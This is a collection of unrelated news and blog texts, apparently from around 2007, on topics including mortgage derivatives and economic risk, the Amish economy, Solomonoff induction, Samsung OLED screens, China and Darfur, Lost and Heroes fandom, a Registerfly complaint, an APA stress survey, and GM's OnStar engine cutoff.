Hedge - fund veteran Rick Bookstaber , the author of A Demon of Our Own Design , spells out a potentially disastrous scenario that could unfold regardless of what the Fed does : Continued foreclosures result in a further drop in housing prices , which results in further foreclosures , which result in a further drop in housing prices .
Even for those of us not selling , reduced home values result in a reduced sense of security , which results in reduced consumption , which results in a slowing economy , which … you get the point .

The Derivatives - Related Meltdown , Part II
Anybody who glances occasionally at the financial pages these days knows that mortgages issued to home buyers are packaged together ( in a process called securitization ) into a collateralized - debt obligation , or CDO .
That ’s what ’s known as a derivative , a security whose value depends on the value of other securities .
The price of the CDO , you see , is “ derived ” from the prices of the underlying mortgages .
( It works with credit cards , too , or bank loans — any kind of debt will do . )
In principle , the idea of a CDO makes perfect sense .
In buying $ 5 million worth of a CDO , an investor has essentially lent money to an entire portfolio of homeowners , instead of placing all his eggs in one basket , say , by funding a single $ 5 million mortgage .
In the real - estate - crazy environment of the past decade , the CDO market took off like a rocket .
But the buyers of these derivatives made a critical error — they confused the spreading of risk with the elimination of risk .
A booming economy made this confusion not just possible but irresistible .
With relatively few defaults in the first half of the decade , investment firms , including many hedge funds , came to see CDO returns as a sure thing and loaded up on them , often borrowing money to do so , taking on debt to buy debt and thereby setting up a potentially deadly chain reaction .
The readiness of the secondary market to buy all these mortgages encouraged the lenders to run wild and lend to anyone who walked through the door , leading — inevitably , in retrospect — to a decline in loan quality .
Analyst Christopher Wood of Asia -Pacific investment house CLSA succinctly defines the problem in his highly readable newsletter Greed & Fear : “ [ Securitization ] has one fatal flaw , which will ultimately prove to be its undoing … it removes the incentive of those making the loan to worry about whether the loan is a good credit . ”
Still , it all held together until mortgage defaults began to cut into the yields of these CDOs and holders looked to sell them , only to realize their value had slipped .
Forced liquidations as a result of that “ price discovery ” were a primary factor in Bear Stearns ’ hedge - fund calamity in August .
And it ’s not over yet :
The aftershocks of the mortgage meltdown are still being felt , as banks such as Citigroup and Deutsche Bank announce multibillion - dollar write - downs .
Each time one of these write - downs has been announced , the market has had a curiously positive response , taking the news as a sign that the worst was over and the banks were cleaning up their books .
But because these derivatives are linked to other debt , there ’s no reason to be certain that trouble wo n’t bleed into other markets .
Among other things , the liquidity crisis froze the market in structured investment vehicles ( SIVs ) , a nifty bit of financial engineering that banks use to profit from the spread between short - term debt and long - term debt .
No one yet knows how nasty these losses could turn out to be because SIVs are stashed , Enron style , off the books .
THREAT NO . 3
Consumers Run Out of Steam ( and Take the Economy Down With Them )
The U.S. economy , for all its worldly sophistication , is driven by mall shoppers and late - night Amazon addicts — 70 percent of the gross domestic product is accounted for by consumer spending , which is buttressed by debt .
According to the Federal Reserve , total U.S. household debt was , as of August , $ 2.5 trillion — a 24 percent increase in the past five years .
Total credit - card debt , including gas cards and the like , was $ 915 billion .
The willingness of consumers to keep spending and piling on debt in the midst of a slowing real - estate market is hailed on Wall Street as an act of patriotism , which Schiff considers perverse .
Imagine , he suggests , that you ran into a good friend and asked him how he was doing .
His reply : “ I took out a third mortgage , maxed out my credit cards , and emptied out my kids ’ college savings account so I could buy a bigger TV and a new car , and we ’re going to Greece on vacation over the holidays .
Things are great ! ”
Schiff lets the idea sink in and then finishes the thought : “ And we ’re celebrating the fact that we ’re doing this as a nation ? ”
In a recent interview , John Santer , a district director of NeighborWorks America , a community - based nonprofit , pointed out that 43 percent of American households spend more than they earn each year , and fewer than six in ten have enough savings to last them three months if they were suddenly out of a job .
So where ’s the money coming from ?
From 1991 to 2005 , Americans borrowed $ 530 billion against the value of their homes each year .
James Glassman , a senior economist at JPMorgan Chase , told a Tulsa , Oklahoma , luncheon crowd in early October that before 1985 , consumer spending grew in line with income , but since that time , it ’s grown half a percent faster on an annual basis .
As a result , household savings , which once reached 10 percent of income , is now literally negative .
“ My guess is that in five years we ’ll look back and realize … that the consumer we knew for twenty years is coming to an end , ” he said .
Roger Ehrenberg , an ex–Wall Streeter and author of the financial blog Information Arbitrage , forecasts extreme financial pain .
“ You ’ve got a weaker dollar , declining economic fundamentals , and a debt - strapped consumer — I ’d call that a bad fact set , ” he says .
“ Lay on top of that the mortgage problem and declining home values , and you can paint a pretty ugly picture . ”

That the Rest of the World Decides They Do n’t Need Us and the Dollar Tumbles Hard
The dollar is falling , possibly collapsing , depending on whom you talk to .
The greenback has sunk close to its lowest point in the post - 1973 floating - exchange - rate era , so low that it ’s been overtaken by the Canadian dollar — affectionately known as the loonie — for the first time since 1976 .
How low will it go ?
When Alan Greenspan was asked by Lesley Stahl of 60 Minutes last month what currency he ’d like to be paid in , his response was telling : “ [ The ] key question … is , ‘ In what currency do you wish to hold your assets ? ’
And what I ’ve done is I diversify . ”
Translation :
He is n’t betting on the dollar .
And neither is the majority of Wall Street .
Here ’s why catastrophists see that as a major problem :
About 25 percent of our government debt is held by foreign governments , with the major holders being Japan ( $ 610.9 billion ) , China ( $ 407.8 billion ) , the U.K. ( $ 210.1 billion ) , and our friends in the Middle East , the oil - exporting countries ( $ 123.8 billion ) .
When the current Fed chairman , Ben Bernanke , cuts rates to soften the housing blow for Americans , he also weakens the dollar by making dollar - based investments less attractive .
And when the dollar weakens , so , too , does the value of these gigantic positions held by the foreign governments .
At some point , they ’re no longer going to tolerate the losses we inflict on them by lowering rates , and if that happens and they start dumping dollars , watch out for the peso .
The bulls will tell you that foreign governments understand the American economy is the key to global economic health , and that they ’ll suck it up and take it when we devalue their debt .
To which Schiff offers another analogy .
Imagine if five people were washed up on a desert island : four Asians and an American .
In splitting up their duties , one Asian says he ’ll fish ; another will hunt , another will look for firewood , and another will cook .
The American assigns himself the job of eating .
“ The modern economist looks at this situation and says the American is key to the whole thing , ” says Schiff .
“ Because without him to eat , the four Asians would be unemployed . ”
The alternative : Without the American , the Asians might eat a little more themselves and even spend some time building a boat .
This is happening as we speak :
With the rise of the Chinese consumer class , the local citizenry is now spending , and the country is no longer totally dependent on exports .
Which means they ’re no longer totally dependent on us .
Readers of the financial press are surely familiar with the buzzword of the moment , decoupling .
It ’s used to describe how U.S. - Europe and U.S. - Asian trade relationships are becoming less dependent at the same time as European - Asian ties are growing .
Most Asian nations , including China , are seeing more rapid growth in exports to Europe than to the U.S.
And the U.S. now accounts for a declining share of European exports .
The bearish interpretation : that the longtime global embrace of the dollar is loosening .
THREAT NO .

That We Do n’t See It Happening Because
It ’s a Slow - Motion Train Wreck
Last but not least , we can circle back to the Dow Jones Industrial Average making new highs in October — 14,087.55 on October 1 — offering hope that our equity portfolios will carry us through to the other side of whatever it is we ’re on the wrong side of .
Before addressing the fact that the equity market might just be clueless , there ’s one last dollar - related point to make .
The true value of a stock portfolio is n’t really its quoted worth in dollars — it ’s what you could buy with that portfolio if you were to sell it .
Given that we as Americans do n’t manufacture that much anymore ( we ’re a service economy ! ) , we are largely talking about foreign - made goods , such as flat - screens from Korea or cars from Germany .
Over time , if the dollar continues to slump , foreign manufacturers will raise prices to compensate for what they ’re losing in the exchange rate .
In that light , a Dow at 14,000 with the euro at $ 1.42 is really no different from a Dow at 13,000 with the euro at $ 1.33 .
( One reason the price of oil has risen so high is that it is quoted in dollars , and the sellers thereof have had to continually jack up the per - barrel price to maintain their own purchasing power at home and elsewhere . )
Still , a rising Dow is better than a falling Dow , and the bulls are piling into every rally .
Which still does n’t impress Jeremy Grantham , chairman of Boston - based money manager GMO , in the least .
“ The equity market is always slow to pick up on someone else ’s crisis , ” he says , referring to the turmoil in both the housing and fixed - income markets .
“ And so you ’ve got a slow - motion train wreck that has to work itself through the system . ”
How will it work itself through ?
Grantham points to the recent strength in profit margins , fueled by — you guessed it !— our plummeting savings rate , and says there ’s nowhere to go but down .
“ If you start with an overpriced market and bring profit margins down , that ’s more than enough to bring stock prices down , ” he says .
“ It is the most certain mean - reversion in all of finance . ”
Grantham calculates that the U.S. stock market will have to fall by a full third before it gets to its “ fair value . ”
At which point we will likely be in full - blown recession .
And when that happens , Schiff says , we will see a country in downsizing mode , “ selling the consumer goods we ’ve been buying back to the Chinese .
It will be one big , giant repossession . ”
So assuming all this is true , that Schiff and his fellow doomsayers are right about the rotten core of the U.S. economy , how will this affect New York City ?
We ’ve grown accustomed to the idea of our local economy , particularly the real - estate market , being inherently stronger than the nation ’s and possibly immune to whatever woes strike the rest of America .
Wall Street , after all , makes money on downs as well as ups , and the stampede of foreigners and foreign cash could , if anything , be aided by the weak dollar .
Last week , though , the argument against New York invincibility was implicitly made when Merrill Lynch announced a larger - than - expected write - down of $ 7.9 billion dollars in its third quarter alone , primarily due to losses in the credit markets .
Numbers as large as that can paradoxically seem trivial due to the abstract nature of accounting — a “ write - down ” involves no movement of real - life cash , just a readjustment of some theoretical values — but here ’s something nontrivial to consider : Merrill Lynch is one of the largest employers in New York City .
While so far only a few Merrill bigwigs have been shown the door , it ’s almost certain that a chunk of the company ’s rank and file will soon follow .
All told , New York–based financial companies had already announced more than 42,000 layoffs as of October , according to one study , and the pace could pick up through the end of the year .
That ’s people who wo n’t be bidding up new apartments , who wo n’t be going out to dinner five times a week , who wo n’t be testing the outer limits of their credit cards at Barneys .
The downstream effects of this could be even more severe , as every Wall Street job is estimated to account for another 1.3 to 2 jobs , meaning that additional job losses could push 100,000 .
Meanwhile , the public sector is feeling it , too .
A recent report by Nicole Gelinas , published by the Manhattan Institute , forecast a budget deficit for New York City next year and predicted that Mayor Bloomberg , who enjoyed a string of budget surpluses until this year , will likely be forced to leave his successor with a double whammy : a deficit and a projected 50 percent increase in outstanding debt .
Of course , the catastrophists could be dead wrong , as they have been for going on a decade now — but to them , it sure smells like the seventies all over again .

The Amish are interesting people .
Having lived much of my life in a rural area with a significant Amish population , I have had the opportunity to interact with them , and have some level of understanding of the culture .
It is a fascinating study .
The Amish make a conscious choice to live without most of the modern conveniences that Americans take for granted .
They have strong religious beliefs and a commitment to principles .
Different communities have varying perspectives on what is allowable and what is not , but they all have a common belief that they must maintain a separation from the world and worldly things .
They provide lessons to us that they may not intend , but are valuable nonetheless .
Their life is centered around the local Amish community , and they live separate lives from non-Amish people around them .
They generally do n't use insurance , but they share risk in a different way .
They have a strong sense of internal community , and in time of disaster , they are drawn together to help their neighbors .
When someone 's barn burns down , there is a barn raising , where the whole community gathers to build a new one .
It is an amazing display of cooperation .
Many people view full employment as the primary purpose of society .
It is a concept that animates much of the discussion in economics and politics .
If full employment truly is the primary goal of our society , then we should follow the lead of the Amish .
They have developed a social structure that provides full employment for every member .
In fact , the problem is not too little employment , but too much employment .
They have to have large families with many helping hands to absorb all of the employment that the lack of modern equipment affords them .
Because they do not use tractors , they need many hands to plow , cultivate , and harvest the fields .
Milking cows by hand is time - consuming manual labor .
Shoveling manure by hand provides employment for some of the less fortunate members of the family .
Cutting , transporting , and stacking wood for heat and cooking provides more work that can keep someone busy and sweaty for a considerable period of time .
By being fairly self reliant , rather than maximizing the benefits of national and international divisions of labor , they choose to be less efficient and to perform activities that subtract from the time they can devote to what they do best .
By shunning modern labor - saving devices and technologies — such as electricity , hay bailers , power equipment , and modern milking facilities — they choose to live with less of everything .
Many fall within the modern definition of poverty .
Nearly all use child labor .
They would starve without it .
Living with less is not necessarily a bad thing .
I believe that most Amish people are very satisfied with their chosen lifestyle .
Most do not regret the choices they made and find their lives quite rewarding .
They are generally people of character who stand up for what they believe in , for the whole world to see .
Should full employment really be the primary goal of modern society ?
The Amish live in an agrarian economy .
It thrives in the midst of modern society , not because of inherent advantages , but rather because it borrows much more from that society than meets the eye .
Most third - world countries are also agrarian societies , mired in a state of misery , reflecting the primitiveness of their economies .
What they do n't have , that the Amish in America do , is economic freedom , secure property rights , a well - developed system of trade , legal protections , fairly reliable money and access to the fruits of capitalist society .
Yes , Amish do go to the store to purchase some things that make their lives simpler and more pleasant .
They rely on cars and busses to transport them long distances .
They use telephones when necessary .
Trucks bring their milk to market .
Modern society is highly dependent on the division of labor , on vast networks of traders , on information and communications .
The goal of modern society is not full employment , but rather the increasing prosperity that comes from continuing innovation and increasing specialization , trade and capital accumulation , where even the poor are better off than most people in the world .
Economic freedom in fact reduces unemployment to levels significantly below those in less free countries .
The Amish may hold the secret to full employment , but rejection of modern capitalism is full employment in poverty and hardship , not the rich fruits of progress .
Solomonoff induction is a mathematically rigorous , idealized form of induction , that is , predicting what will happen in the future based on prior experiences .
It is a part of algorithmic information theory .
This induction scheme is theoretically optimal , i.e. , given enough data , it will always be able to assign probabilities to future events with the maximum possible accuracy allowed .
The only problem with Solomonoff induction is that it is incomputable -- that is , it would require a computer with infinite processing power to run .
However , all successful inductive schemes and machines -- including animals and humans -- are approximations of Solomonoff induction .
Scientist with beakers
Every verbal argument containing advice for better induction , to the extent that it actually works , works by coaxing the listener into modifying his or her inductive strategy in such a way that it better approximates the theory .
The idea that induction can be mathematically formalized in this way is quite profound , and many generations of logicians and philosophers said it could n't be done .
The theory grew out of work by Ray Solomonoff , Andrey Kolmolgorov , and Gregory Chaitin in the 1960s .
Their underlying motivation was to formalize probability theory and induction using axioms , in the same way that algebra and geometry have been formalized .
The theory is based on an inductive rule called Bayes ' theorem , which describes a precise mathematical way to update beliefs based on incoming data .
One weakness in Bayes ' theorem is that it depends on a prior probability for a certain event .
For example , the probability of an asteroid impacting Earth in the next 10 years can be given on the basis of historical data about asteroid impacts .
However , when the sample size of prior events is low , such as the number of times a neutrino has been detected in a neutrino trap , it becomes very difficult to predict the likelihood of the event happening again based solely on past experience .
This is where Solomonoff induction comes in .
Using an objective measure of complexity called Kolmogorov complexity , the theory can make an educated guess about the probability of some future event occurring .
Kolmogorov complexity is based on a principle called Minimum Description Length ( MDL ) , which assesses the complexity of a string of bits based on the shortest algorithm that can output that string .
Although Kolmogorov complexity initially applied to bitstrings only , it can be translated to describe the complexity of events and objects .
Solomonoff induction integrates Kolmogorov complexity into Bayesian reasoning , giving us justified priors for events that may never even have happened .
The prior probability of an arbitrary event is judged based upon its overall complexity and specificity .
For example , the probability of two random raindrops in a storm hitting the same square meter is fairly low , but much higher than the probability of ten or a hundred random raindrops hitting that square meter .
Some scientists have studied the theory in the context of neuroanatomy , showing how optimal induction is an organizing principle in the evolution of animals that need accurate induction for survival .
When true Artificial Intelligence is created , the principles will be a likely inspiration underlying its construction .
SEOUL ( Reuters ) - South Korean display screen maker Samsung SDI Co 006400 .KS said on Wednesday it started mass producing ultra thin flat screens and would double capacity by next year , sending its shares surging 14 percent .
The world ’s No.3 maker of plasma display panels is increasingly looking at the super thin screens called AM - OLED as a growth driver , as they produce brighter images and use less power .
Samsung SDI said it would double monthly output capacity of active - matrix organic light - emitting diode ( AM - OLED ) displays to 3 million units by 2008 from 1.5 million now .
The company has been plagued by falling prices and weak margins in both plasma display panels ( PDP ) and traditional cathode - ray tubes for televisions .
“ This is something that is necessary for the firm .
They have to invest in a new business , ” said Jay Yoo , analyst at Korea Investment and Securities .
Samsung SDI shares jumped to a near one - year high of 74,900 won ( $ 82 ) in the stock 's biggest daily percentage gain since March 15 , 2002 , far outpacing the main KOSPI 's .
KS11 1.3 percent gain .
The stock had gained 2.2 percent so far this year as of Tuesday , underperforming the broader market ’s 40 percent rise .
Flat screen makers are betting OLED screens will replace the currently dominant LCD panels on multimedia mobile phones and portable media players .
Japan's Sony Corp 6758.T last week announced the December launch of the first TV set that uses AM - OLED technology .
Just 3 mm thick , the TV has an 11 - inch screen and sells for 200,000 yen ( $ 1,704 ) .
For that price , consumers can find 40 - inch LCD models .
“ Everybody agrees AM - OLED will be the next - generation display instead of LCD and plasma , ” said Jeff Kim , analyst at Hyundai Securities .
“ But we have to be realistic .
The LCD and PDP markets are not mature yet and will still grow until 2010 - 11 .
“ Even if AM - OLED became popular , manufacturers will not be able to meet the break - even point because of price competition . ”
Research firm DisplaySearch expects the global OLED TV market to grow 24 - fold to $ 884 million in 2011 from an estimated $ 37 million in 2008 , far outpacing 15 percent growth in LCD TV demand .
However , the 2011 figure for OLED TVs is less than 1 percent of projected LCD TV revenues of $ 92 billion for the same year .
Samsung SDI dismissed the notion it could enter an AM - OLED TV war with Sony .
“ AM - OLEDs are an ideal technology for portable displays , ” Kim Jea-wook , president of Samsung SDI ’s display unit , told a press conference .
“ Any decision to enter the television business will be made depending on circumstances . ”
From a technological viewpoint , Kim said Samsung SDI had about a year ’s advance on Sony .
Regarding the company ’s ailing plasma display unit , Kim said the division would reach break - even sometime next year .
Samsung SDI was the world 's top producer of PDPs in 2005 , but was overtaken by Japan 's Matsushita Electric Industrial Co 6752.T and local rival LG Electronics 066570 .
KS last year amid production problems and declining sales .
The company posted a bigger - than - expected second - quarter net loss in July , hurt by tumbling prices of its television screens .

China , on a domestic and international cleaning binge , is seeking to cleanse its status and reputation by the time it begins hosting the Olympics in 2008 to appear as a developed nation in a first - world prom dress .
While this may appear as a farcical whitewash operation by a totalitarian regime , it presents an opportunity for the international community to take concrete steps in resolving the Darfur crisis .
While the Darfur conflict has been well - documented ( Wiki on Darfur Conflict ) and officially labeled a genocide by the American government , the nations that allowed the situation to continue have until recently seen relatively little outside pressure else than the editorial page .
China , as the leader in Sudanese oil imports , is at the center of enabling the Sudanese government .
As the BBC states of the rise of China as an energy importer :
“ From zero 15 years ago , China last year became the world ’s number two oil importer …
China has , we are told , been running around the world signing oil deals with everyone from Iran , to Sudan to Angola .
In the race to secure future oil resources China is prepared to deal with even the dodgiest regimes , and pay the highest prices . ”
China ’s economic relations with the Sudanese government provided it with significant leverage that it has chosen not to use until of late .
With concerns about manners , proper English , and all things image savvy that will hopefully provide an ideal experience for the foreign traveler visiting China for the first time at the 2008 Olympics , China is similarly trying to improve its image abroad as well .
Helen Cooper writes in the New York Times about the collision between the internal worries of public image in China and the relation with diplomacy :
China ’s decision to pressure Sudan about violence in Darfur , after years of protecting that government , can be traced to campaign to boycott 2009 Olympic Games in Beijing ; Mia Farrow , good - will ambassador for United Nations Children ’s Fund , started campaign to label Games in Beijing ‘ Genocide Olympics ’ and called on corporate sponsors to publicly exhort China to do something about Darfur ; she challenged Steven Spielberg , artistic advisor to China for Games , to add his voice , prompting Spielberg to send letter to Pres Hu Jintao of China asking him to use his influence to stop killings in Darfur ; senior Chinese official , Zhai Jun , recently traveled to Sudan to push government there to accept UN peacekeeping force , and then visited Darfur refugee camps ; turnaround in China ’s policy serves as classic study of how pressure campaign , aimed to strike Beijing in vulnerable spot at vulnerable time , could accomplish what years of diplomacy could not …
If the United Nations and the West are serious about ending one of the greatest humanitarian disasters of the decade , it must utilize the chance given in this pre-Olympic window by China .
With the first noticeable signs that China is willing to act , a formidable and unified multilateral consensus should take advantage of a diplomatically - sensitive China to leverage a more proactive role in solving the Darfur crisis .

Nathan Petrelli ( Adrian Pasdar ) spoke a cryptic line on  Heroes that some fans say ties the NBC series to ABCs Lost . ( Dean Hendler / NBC )
It 's all connected ?
Fans say there 's evidence that ties ' Lost ' and ' Heroes ' together , but creators do n't buy it Across the Internet , the screen - grabbing obsessives -- the ones who deal in frame - by - frame analysis of ABC 's " Lost " -- were getting in a lather about the NBC hit " Heroes . "
It had to do with a brief scene a few weeks ago , when Nathan Petrelli , the caddish politician who can shoot into the air like a bottle rocket , grumbled about what might happen if word got out about his powers .
Officials could " round us all up , stick us in a lab on some island in the middle of the ocean , " Nathan said .
And within nanoseconds , the clarion call clanged out in cyberspace : " Heroes " mentions island !
It must be a reference to " Lost " !
Yes , " Lost " and " Heroes " air on different networks , tell different stories , and exist -- as " Lost " producers point out -- in totally different time frames .
( The " Lost " castaways live , after all , in the fall of 2004 . )
But to their most devoted fans , the shows have come to represent a sort of yin and yang of serial TV , in constant battle for the title of the Mystery Show That Does It Better .
" Lost , " the word goes , is deeper and more cinematic ; " Heroes " is pulpier and better - paced .
And the way fans sometimes talk , there seems a cosmic cyber - wish for the shows to somehow merge -- to meld into a single supernatural drama that doles out questions and answers in acceptable weekly doses .
Indeed , some seem to believe it 's already happening .
One fansite , darkufo.
blogspot.com , has posted pictures of a " Gannon Car Rentals " brochure , held by Hiro in " Heroes , " and Hurley and Claire in " Lost . "
It also shows off photos of a suncatcher in the background of a trailer in " Heroes , " and a similar , fleeting image from a torture video in " Lost . "
Some fans have noted casting coincidences : Greg Grunberg , who plays Matt Parkman on " Heroes , " had a short stint as a doomed pilot on " Lost . "
And on a recent Entertainment Weekly blog , Jeff " Doc " Jensen half - jokingly floated the idea that the Dharma Initiative , a fictional company in " Lost , " created the super - folks who populate " Heroes . "
( He added , " Oh , like they would ever admit it if this were true ! " )
A vast conspiracy ?
That would be wish - fulfillment at its most geekishly appealing .
So it might cause disappointment , in certain circles , to reveal that the heads of both shows claim absolute ignorance .
" Really ? " said " Heroes " creator Tim Kring in a telephone interview last week , when told about the eerily - similar car - rental brochures .
Then he quickly came up with the same mundane theory that " Lost " executive producer Carlton Cuse had suggested a day earlier .
Some fictional names , Cuse explained , have been cleared , for legal purposes , for use by TV studios : Oceanic Airlines , featured prominently in " Lost , " also turned up in the movie " Executive Decision . "
So it 's not such a stretch to imagine that a pamphlet for " Gannon Car Rentals , " preprinted and free of legal strings , might have wound up in the hands of the " Heroes " prop department .
" Sometimes , " Cuse said , " a rental - car pamphlet is just a rental - car pamphlet . "
As for that suncatcher ?
Nothing intentional , producers swear .
But the thought of a link gets Kring talking a bit like a fanboy himself .
" That 's fantastic !
That 's so great ! " he said .
" What if this is sort of happening on some sort of bizarre cosmic level , and we 're not even aware of it ?
That 's the best conspiracy . "
It 's not that there are n't connections between " Heroes " and " Lost " ; there are deep ones , in fact .
But they generally have to do with the trajectories of Hollywood careers and the legal vagaries of show business .
In short , they 're less about international mystery and more about " Crossing Jordan . "
That 's the NBC medical - examiner drama that Kring created ; it premiered in 2001 , and had on staff an up - and - coming young writer named Damon Lindelof .
Toward the end of the third season , Lindelof recalls , he asked permission to meet with " Alias " creator J.J. Abrams , who had an idea for a show about a plane crash on a desert island .
As Lindelof recalled last week , Kring " was incredibly gracious , " and helped Lindelof get out of his NBC contract and become a co-creator and executive producer of " Lost . "
And , a few years later , when Kring was working on a pilot about genetic mutations and superpowers , he called his old colleague Lindelof to bounce off some ideas .
" We had a couple lunches , had a couple beers , he would talk to me about some of the ideas he was having . . . sort of pick my brain , " Lindelof said .
To good effect .
It was Lindelof , it turns out , who suggested the plot - twist ending of the " Heroes " pilot :
That idealistic Peter Petrelli , who believed he could fly , should plummet off a building and be rescued by his brother Nathan -- who actually could .
( It was Kring , Lindelof said , who added the idea that Peter has powers , too . )
For the most part , Lindelof said , he offered generalized advice about the overarching truths he had learned after the first season of " Lost . "
The show aired for two seasons before " Heroes " joined the NBC lineup and became a breakout hit , routinely topping " Lost " in the ratings .
" Do n't be afraid to make it really expensive , " Lindelof said he told Kring .
" Do n't be afraid to have a large , sprawling cast .
Do n't be afraid to kill people off . "
And Kring said the success of " Lost " made it easier to pitch and plot his own ambitious show .
" Lost " pioneered the model of a " parity " pay scale , which made a large ensemble cast seem more affordable .
And the scheduling woes that have angered " Lost " fans made Kring extract a promise from NBC : set the schedule in stone .
Knowing he would face a pair of six - week breaks , he said , allowed him to plot out a couple of mini-cliffhangers .
But the conceits behind the shows are different , too , Kring said .
And because he's not locked in space or time , he has the easier job .
" We 're not positing the central mysteries that you have to wrap a story around , " he said .
" It frees us up to tell a story at a different pace . "
Lindelof and Kring have n't talked shop in a while ; both say they 're immersed in their own shows .
But the brain - power link between the series has continued .
Writer Jesse Alexander moved to " Heroes " from " Lost " ( he knew " where the bodies were buried , " Kring said ) .
So did writer Jeph Loeb , a comic - book veteran who has known Kring since the ' 80s , when he co-wrote the movie " Teen Wolf " and Kring wrote the screenplay for the sequel , " Teen Wolf Too . "
It was Loeb , Kring notes , who wrote the " Heroes " episode that featured Nathan 's desert island speech .
So it might have been a shout - out , Kring said , to his former colleagues on " Lost . "
Lindelof did n't take it that way .
He 's a comic - book aficionado himself -- he wrote the graphic miniseries " Ultimate Wolverine vs. Hulk " -- and said he thought that was a reference to Genosha , an island in the Marvel Comics books where mutants are exiled .
" It did n't even occur to me that it was a wink - wink to ' Lost , ' because our characters do n't have superpowers , " he said .
Then there 's the recent reference to " fish biscuits " -- the unappetizing food that Sawyer gnawed in an outdoor cage on " Lost " -- on Hiro 's fictitious blog on the NBC " Heroes " website .
Here , Kring claims ignorance , as well .
He does n't write the blog .
But it was probably a pop culture reference , he says .
Which makes him wax a little philosophical .
" We 've often asked ourselves the question -- and this is something that a lot of people never think about -- does ' Heroes ' exist in the same world that ' Lost ' does ? " he said .
" In our world , do Claire 's friends watch ' Lost ' on television ? "
And if the characters on " Lost " exist in the world of " Heroes , " the chance for a TV rendezvous gets even more complex .
Getting them together , after all , would require a trip to the past .
It could only be done by Hiro , the " Heroes " character who has the power to bend time and space .
And Lindelof has a thought .
" If there was ever a crossover , " Lindelof said , " he would pop up , appear on the beach for , like , two seconds .
He 'd look at Hurley and he'd say , ' Hello , ' and Hurley would say , ' Hello , ' and then he would disappear again .
And that would be it . "
Cuse , Lindelof , and Kring all agree that 's unlikely to happen .
The shows are produced by different studios and networks -- all with different lawyers -- and the paperwork hurdle would likely be insurmountable .
But Kring , for one , says he loves the idea .
" If we could talk them into doing it , " he said , " we 'd do it . "

We Can’t Fill Your Order or Give You A Refund
It is rare ( actually , this is tied into the only 1 other time I have ever issued a warning about a vendor on this site ) that I actually take the time to point out an online vendor whose errors are grave enough to warrant boycott .
Some of this is the fear of reprisal , but the majority of this comes from working at a web - based company and knowing how common it is for customers to just get confused when really no problem exists at all .
With Registerfly , this is not the case .
My ordeal began over a month and a half ago when I sought to register 10 domains on my own behalf .
The registrations were for 2 years each and the order came to about $ 140 .
Registerfly had always been slower than the other registrars I normally used , but the price was right , so I was not surprised when a day or two later the domains had not yet propagated .
So I waited .
I became alarmed when several days into the process I could still not change nameservers on the account .
This tipped me off to check the whois at which point I realized that the domains had not been registered at all .
Below is a screenshot of several of the support requests that have since gone in .
What is not accounted for are the countless phone calls and online - chat - requests I have made with Registerfly .
I have never successfully encountered a Registerfly representative via the online chat system .
I have let it up , literally , for over an hour before and not received even a “ hello , I am _____ , how may I help you today ” .
The one time I was able to get on the phone with a Registerfly representative coincided with the third post in the above screenshot .
After much holding , the representative identified that something had “ gone wrong ” in the registration process , “ holding it up ” ( i love the technical explanations , they always comfort me ) , so he told me to restart the registration process and placed the money back into my account .
This is where I made the most foolish mistake .
Putting money back into my registerfly account is like refunding something at Target and accepting a gift card instead of cash .
It makes it incredibly difficult to trace the money back to the original purchase ( even if you have the credit card info ) so that a true refund can be made if the next transaction ( s ) fail .
Which is where we are today .
Another several weeks later the 10 domains are still not registered .
I have issued a Full Refund request at Registerfly that has not yet been responded to .
It has been two weeks since that request and I have not even so much as received an initial response .
They ca n’t fill my order , and wont give me a refund .
It is like buying a coffee at starbucks but , when they run out of coffee , they wont give you your money back .
Why am I not surprised .
Please spread the word about Registerfly .
I have worked with over 25 registrars and have never encountered anything nearly as abysmal as their service and support .

Isiah Thomas :
Only black men allowed to call women the 'b word '

A bizarre deposition given by the coach of The New York Knicks in a sexual harassment suit has attracted much attention in the media .
During the testimony , former Detroit Pistons legend Isiah Thomas suggested that when a black man refers to a woman as a " bitch " it 's less offensive than when a white man does the same .
" White men better not call a black woman ' bitch ' around Knicks coach Isiah Thomas , but if black men do it - well , that 's fair game , " Kati Cornell writes in Tuesday 's New York Post .
Excerpts from New York Post article :
#
" I 'm sorry to say , I do make a distinction , " Thomas said in a videotaped admission viewed by a Manhattan federal jury yesterday .
" A white man calling a black female ' bitch , ' that is wrong with me .
I am not accepting that .
That 's a problem for me , " he said .
But asked if he'd have a problem with a black man calling a black woman " bitch , " Thomas said , " Not as much . "
....
In a statement yesterday , Thomas said , " Let 's not mischaracterize what I said .
What I said is it is always wrong for any man to call a woman a bitch .
I did n't do that , and I would never do that . "

This video is from CNN's American Morning , broadcast September 18 .
We ’re stressed out , we ca n’t sleep , we ’re drinking too much – and it ’s getting worse .
Forty - eight percent of Americans say they ’re more stressed now than they were five years ago , and the same percent report regularly lying awake at night because of stress , according to a new study by the American Psychological Association .
“ Stress continues to escalate , and it ’s affecting every area of people ’s lives , ” said Russ Newman , a psychologist and executive director of the APA .
So what is it we ’re worrying about while we stare at the ceiling all night ?
Primarily two things : money and work , the main woes for nearly 75 percent of Americans .
That ’s way up from 59 percent of us stressed out over those two things a year ago .
We ’re also worrying about making the rent .
More than half of people polled say paying the landlord or making the monthly mortgage causes great stress .
The APA study was conducted online and involved interviews with 1,848 Americans nationwide .
According to the report , all that stress and worry is taking a big toll on our lives , leading us to fight with family members , drink , smoke and give up on working out .
“ The high stress levels that many Americans report experiencing can have long - term health consequences , ranging from fatigue to obesity and heart disease , ” Newman said .
The study found that as a result of stress , 54 percent of people have fought with loved ones , and 8 percent say stress has led to separation or divorce .
More than three - quarters of respondents say stress is making them sick , from headaches ( 44 percent ) to upset stomach ( 34 percent ) and grinding their teeth ( 17 percent ) .
And then there ’s the not - so - healthy ways people try to handle all that stress , from eating junk food to tipping the bottle .
Forty - three percent claim they eat – or overeat – unhealthy food to deal with stress , while a third say they lose their appetite and start skipping meals .
Drinkers and smokers report downing more booze and lighting up more often when feeling the effects of stress .
“ Some people feel overwhelmed and out of control , ” said Beverly Thorn , a University of Alabama psychologist who was one of the researchers involved in the study .
Thorn explains that people turn to bad habits when under stress – and that often makes them feel even worse .
“ It ’s a vicious cycle , ” she said .
But it ’s not all bad news .
More than half of Americans listen to music , read , or exercise as a way to alleviate stress .
Others spend time with family and friends .
More than a third say they pray when stressed out .
General Motors plans to equip 1.7 million of its 2009 models with a system that allows OnStar operators to cut engine power in the car if the police request it .
The system was demonstrated in Washington , D.C. today .
GM 's OnStar system already contains built - in GPS tracking that would allow police to find any OnStar - equipped vehicle .
With the new technology , if the police request it , an OnStar operator will inform the occupants of the vehicle and then cut power .
The engine will be slowed to idle speed , to allow the driver to move to the side of the road .
Brakes and other electrical functions of the vehicle will still work .
